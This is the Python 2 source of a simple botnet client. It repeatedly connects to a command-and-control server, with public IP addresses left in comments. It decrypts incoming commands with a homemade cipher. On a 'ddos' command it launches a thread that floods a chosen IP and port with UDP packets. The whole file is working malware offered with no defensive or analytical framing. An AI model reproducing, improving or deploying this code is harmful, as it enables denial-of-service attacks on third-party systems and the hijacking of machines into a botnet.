import sys
import socket
import string
import os
import time
import random
import urllib2
import re
import threading
#import geoip

def enc(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])-10+(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;
def dec(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])+10-(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;

global cmd

class DDOS ( threading.Thread ):
    def run ( self ):
        target = (cmd[1],cmd[2]);
        soc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
        for x in range(25*cmd[3]):
            for x in range(1000):
                soc.sendto("asdsdsdsd",target);
        print 'Finished DDOSing'

#HOST = '75.68.47.220'
HOST = '127.0.0.1'
#HOST = '173.0.0.109'
PORT = 8888

#main loop
flag = True
connFlag = True
connected = False
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while connFlag:
    try:
        s.connect((HOST, PORT))
        connFlag = False
    except:
        print "Trying to connect again in 2 second"
    time.sleep(2)

key = "this is the best key in the world, you'll never guess it :D 4&#*%:J"

while 1:
    cmd = s.recv(10000)
    cmd = dec(cmd, key)
    cmd = cmd.split(" ")
    if cmd[0] == 'test':
        print "Test command recieved successfully :)"
    elif cmd[0] == 'ddos':
        cmd[2] = int(cmd[2])
        cmd[3] = int(cmd[3])
        print "DDOSing " + str(cmd[1]) + " on port " + str(cmd[2])
        d = DDOS()
        d.start()
